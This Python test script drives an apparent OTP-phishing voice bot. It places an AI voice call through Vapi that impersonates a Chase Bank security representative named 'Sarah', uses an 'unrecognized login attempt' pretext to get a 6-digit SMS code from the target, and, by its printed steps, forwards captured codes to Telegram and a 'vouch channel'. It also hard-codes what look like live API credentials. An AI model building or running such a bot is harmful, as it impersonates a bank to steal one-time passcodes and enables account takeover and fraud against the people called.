"""Vapi test call #2 - full live feed + OTP test"""
import sys, os, logging, json, time
sys.path.insert(0, os.getcwd())
logging.basicConfig(level=logging.INFO, format="%(levelname)s - %(message)s")

os.environ["VAPI_API_KEY"] = "2f8130f3-20fe-47e9-93b0-00f320011a9c"
os.environ["VAPI_ASSISTANT_ID"] = "9f6a791d-3780-44b7-ae42-49b59bc2a14a"
os.environ["VAPI_PHONE_NUMBER_ID"] = "5336513a-b894-42e1-a2fa-15bc8a9a1305"

from services.vapi_service import create_call, get_call
from services.prompt_builder import PromptBuilder
from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior

target_phone = "+18882804331"
chat_id = 8366864444

metadata = CallMetadata(
    target=TargetInfo(name="John", phone=target_phone),
    company=CompanyInfo(name="Chase Bank", department="Security", representative_name="Sarah"),
    reason="Unrecognized login attempt",
    otp=OTPConfig(length=6, delivery_method="sms"),
    ai=AIBehavior(language="en"),
)

builder = PromptBuilder()
system_prompt = builder.build(metadata)
assistant_overrides = metadata.to_vapi_assistant_overrides()
assistant_overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
assistant_overrides.pop("voice", None)

call_metadata = {
    "chat_id": str(chat_id),
    "user_id": "real_test_user",
    "code_length": 6,
}

print("=" * 60)
print("MAKING CALL TO:", target_phone)
print("=" * 60)
print("📌 Answer the phone when it rings!")
print("📌 Say: 'my code is 123456' when Sarah asks for it")
print("📌 Then check Telegram for OTP notification + ACCEPT button")
print("📌 Vouch channel should get the post after accept\n")

vapi_call_id = create_call(
    customer_number=target_phone,
    customer_name="John",
    assistant_overrides=assistant_overrides,
    metadata=call_metadata,
)

if vapi_call_id:
    print(f"\n✅ CALL ID: {vapi_call_id}")
    print(f"⏳ Monitoring for 90s...\n")
    for i in range(18):
        time.sleep(5)
        try:
            call_data = get_call(vapi_call_id)
            if call_data:
                status = call_data.get("status", "unknown")
                ended = call_data.get("endedReason", "")
                duration = call_data.get("durationMs", 0)
                transcript_raw = call_data.get("artifact", {}).get("transcript", "")
                
                status_line = f"[{i*5+5}s] Status: {status}"
                if ended:
                    status_line += f" | ended: {ended}"
                if duration:
                    status_line += f" | duration: {round(duration/1000)}s"
                print(status_line)
                
                if status in ("ended", "completed", "failed", "canceled"):
                    if transcript_raw:
                        print(f"\n📝 CALL TRANSCRIPT:")
                        print(transcript_raw[:2000])
                    print(f"\n✅ Call finished. Reason: {ended or 'N/A'}")
                    break
        except Exception as e:
            print(f"  [{i*5+5}s] Error polling: {e}")
else:
    print("\n❌ FAILED to create call")